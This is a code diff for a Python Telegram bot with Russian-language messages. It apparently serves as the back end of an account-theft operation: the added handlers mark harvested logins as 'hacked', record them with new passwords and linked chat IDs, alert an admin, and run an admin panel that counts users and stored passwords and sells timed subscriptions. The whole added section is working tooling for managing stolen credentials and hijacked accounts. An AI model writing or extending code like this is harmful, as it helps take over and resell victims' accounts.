@@ -209,7 +209,7 @@ def setup():
     init_db()
     return "Webhook and DB set", 200
 
-# === Команди бота ===
+    # === Команди бота ===
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     chat_id = str(message.chat.id)
@@ -456,4 +456,96 @@ def handle_status(call):
         bot.send_message(ADMIN_CHAT_ID, f"🔒 {login} добавлено в взломанные со статусом '{status}'!")
         bot.answer_callback_query(call.id, "Успешно добавлено!")
 
-@bot.callback_qu
+@bot.callback_query_handler(func=lambda call: call.data.startswith("link_"))
+def handle_link(call):
+    if not is_admin(call.message.chat.id):
+        bot.answer_callback_query(call.id, "🔒 Доступно только администраторам!")
+        return
+    _, login, new_password = call.data.split("_")
+    msg = bot.send_message(call.message.chat.id, 
+                          f"Логин: {login}\nНовый пароль: {new_password}\nВведите Chat ID (или 'нет'):")
+    bot.register_next_step_handler(msg, lambda m: process_link(m, login, new_password, call.message.message_id))
+    bot.answer_callback_query(call.id, "Введите Chat ID")
+
+def process_link(message, login, new_password, original_message_id):
+    linked_chat_id = message.text if message.text.lower() != "нет" else None
+    status = "Взломан"
+    if delete_credential(login):
+        save_hacked_account(login, new_password, prefix=status, sold_status=status, linked_chat_id=linked_chat_id)
+        bot.edit_message_text(chat_id=message.chat.id, message_id=original_message_id,
+                             text=f"Логин: {login}\nПароль: {new_password}\n✅ Добавлено со статусом '{status}'!\nПривязка: {linked_chat_id or 'Нет'}", reply_markup=None)
+        bot.send_message(ADMIN_CHAT_ID, f"🔒 {login} добавлено в взломанные с привязкой: {linked_chat_id or 'Нет'}!")
+    bot.delete_message(message.chat.id, message.message_id)
+
+@bot.message_handler(commands=['admin'])
+def admin_cmd(message):
+    if not is_admin(message.chat.id):
+        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
+        return
+    users_count = len(get_all_users())
+    passwords_count = len(get_all_credentials())
+    response = f"⚙️ Админ-панель:\nПользователей: {users_count}\nПаролей: {passwords_count}\n\n"
+    if is_creator(message.chat.id):
+        response += "📋 Список пользователей:\n"
+        users = get_all_users()
+        if not users:
+            response += "Нет зарегистрированных пользователей.\n"
+        else:
+            for user in users:
+                time_left = user['subscription_end'] - datetime.now()
+                time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Подписка истекла"
+                response += f"Chat ID: {user['chat_id']}\nПрефикс: {user['prefix']}\nПодписка: {time_str}\n\n"
+    response += "📜 Доступные команды:\n/start\n/menu\n/site\n/hacked\n/passwords\n/admin\n/setprefix\n/delprefix\n/clearold\n/getchatid"
+    if is_creator(message.chat.id):
+        response += "\n/opendb\n/database"
+    if len(response) > 4096:
+        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
+        for part in parts:
+            bot.reply_to(message, part)
+    else:
+        bot.reply_to(message, response)
+
+@bot.message_handler(commands=['setprefix'])
+def setprefix_cmd(message):
+    if not is_admin(message.chat.id):
+        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
+        return
+    args = message.text.split()[1:]
+    if len(args) != 3:
+        bot.reply_to(message, "❌ Формат: /setprefix <chat_id> <prefix> <days>")
+        return
+    chat_id, prefix, days = args[0], args[1], args[2]
+    try:
+        days = int(days)
+        subscription_end = datetime.now() + timedelta(days=days)
+        save_user(chat_id, prefix, subscription_end)
+        bot.reply_to(message, f"✅ Префикс {prefix} установлен для {chat_id} на {days} дней!")
+    except ValueError:
+        bot.reply_to(message, "❌ Количество дней должно быть числом!")
+
+@bot.message_handler(commands=['delprefix'])
+def delprefix_cmd(message):
+    if not is_admin(message.chat.id):
+        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
+        return
+    args = message.text.split()[1:]
+    if len(args) != 1:
+        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
+        return
+    chat_id = args[0]
+    delete_user(chat_id)
+    bot.reply_to(message, f"✅ Пользователь {chat_id} удален из базы!")
+
+@bot.message_handler(commands=['clearold'])
+def clearold_cmd(message):
+    if not is_admin(message.chat.id):
+        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
+        return
+    deleted = clear_old_credentials()
+    bot.reply_to(message, f"✅ Удалено старых паролей: {deleted}")
+
+if __name__ == "__main__":
+    import threading
+    threading.Thread(target=keep_alive, daemon=True).start()
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
